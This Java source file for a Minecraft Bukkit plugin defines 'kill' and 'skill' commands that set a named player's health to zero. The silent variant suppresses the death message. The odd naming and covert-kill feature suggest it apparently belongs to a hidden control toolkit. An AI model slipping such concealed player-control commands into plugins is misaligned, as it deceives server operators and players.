package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.PlayerDeathEvent;

import java.util.ArrayList;

public class Kill implements Command, Listener {
    private final ArrayList<String> names = new ArrayList<>();

    @Override
    public String[] getCommands() {
        return new String[]{"kill", "skill"};
    }

    @Override
    public String getDescription() {
        return "Kills or silently kills a player.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + context.getCommand() + " <player>");
            return;
        }

        Player player = Bukkit.getPlayer(args[0]);
        if (player == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        boolean isSilent = context.getCommand().equalsIgnoreCase("skill");
        if (isSilent) {
            names.add(player.getName());
        }

        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            player.setHealth(0);
            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully " + (isSilent ? "silently " : "") + "killed " + player.getName() + "!");
        });
    }

    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void onDeath(PlayerDeathEvent e) {
        if (e.getEntity().getType() != EntityType.PLAYER) {
            return;
        }

        String name = e.getEntity().getName();

        if (names.contains(name)) {
            e.setDeathMessage("");
            names.remove(name);
        }
    }
}
